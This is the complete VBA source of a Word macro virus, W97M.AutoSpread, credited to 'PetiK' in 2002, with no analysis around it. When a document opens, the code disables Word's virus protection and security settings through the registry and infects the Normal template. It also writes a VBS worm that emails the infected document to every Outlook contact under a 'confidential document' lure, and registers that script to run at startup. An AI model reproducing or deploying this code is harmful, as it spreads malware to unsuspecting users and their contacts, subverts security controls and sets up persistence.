Attribute VB_Name = "AutoSpread"

Private Declare Function Sleep& Lib "kernel32" (ByVal dwReserved As Long)

Sub AutoOpen()
nam = ActiveDocument.Name
vnam = Left(nam, Len(nam) - 4)

Call FuckProtection
Call InfectWord
Call Spread

If Day(Now) = 8 Then
MsgBox "This Document is infected by W97M." + vnam, vbCritical, "W97M." + vnam + ".A"
End If

End Sub

Sub InfectWord()
On Error Resume Next
Set nor = NormalTemplate.VBProject.VBComponents
Set doc = ActiveDocument.VBProject.VBComponents
srcmod = "C:\kitep.drv"
If nor.Item("AutoSpread").Name <> "AutoSpread" Then
    doc("AutoSpread").Export srcmod
    nor.Import srcmod
    End If
If doc.Item("AutoSpread").Name <> "AutoSpread" Then
    nor("AutoSpread").Export srcmod
    doc.Import srcmod
    ActiveDocument.Save
    End If
Kill (srcmod)
End Sub

Sub FuckProtection()
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
Select Case Application.Version
Case "10.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
Case "9.0"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End Select
WordBasic.DisableAutoMacros 0
End Sub

Sub Spread()
On Error Resume Next
subj = Left(ActiveDocument.Name, Len(ActiveDocument.Name) - 4)
att = ActiveDocument.FullName
win = Environ("windir")
FileSystem.MkDir win + "\AutoSpread"
x = 0
nfile = ""
Do While x < 8
Randomize (Timer)
nfile = nfile + Chr(Int(Rnd(1) * 8) + 48)
x = x + 1
Loop
reg = nfile
nfile = nfile + ".vbs"
nfile = win + "\AutoSpread\" + nfile
Open nfile For Output As #1
Print #1, "'From W97M.AutoSpread"
Print #1, "On Error Resume Next"
Print #1, "Set out=CreateObject(""Outlook.Application"")"
Print #1, "Set map=out.GetNameSpace(""MAPI"")"
Print #1, "For Each C in map.AddressLists"
Print #1, "If C.AddressEntries.Count <> 0 Then"
Print #1, "For D=1 To C.AddressEntries.Count"
Print #1, "Set E=C.AddressEntries(D)"
Print #1, "Set env=out.CreateItem(0)"
Print #1, "env.To=E.Address"
Print #1, "env.Subject=""" + subj + """"
Print #1, "env.Body=""This confidential document is for you."""
Print #1, "env.Attachments.Add(""" + att + """)"
Print #1, "env.DeleteAfterSubmit=True"
Print #1, "If env.To <> """" Then"
Print #1, "env.Send"
Print #1, "End If"
Print #1, "Next"
Print #1, "End If"
Print #1, "Next"
Print #1, "WScript.Quit"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", reg) = nfile
End Sub

Sub HelpAbout()

With Application.Assistant
    .Visible = True
End With
With Assistant.NewBalloon
    .Text = "W97M.AutoSpread.A coded by PetiK (c)2002"
    .Heading = "W97M.AutoSpread"
    .Animation = msoAnimationGetAttentionMajor
    .Button = msoButtonSetOK
    .Show
End With

slp = Sleep(5000)

For nb = 1 To Int(Rnd(1) * 10) + 1
Selection.TypeText "Hi guy, You're infected by my virus. It's not dangerous. "
Selection.TypeText "Refer to AntiVirus site to disinfect your computer. "
Selection.TypeText "No dangerous payload, large spread, it's coded by PetiK. "
Next nb

End Sub
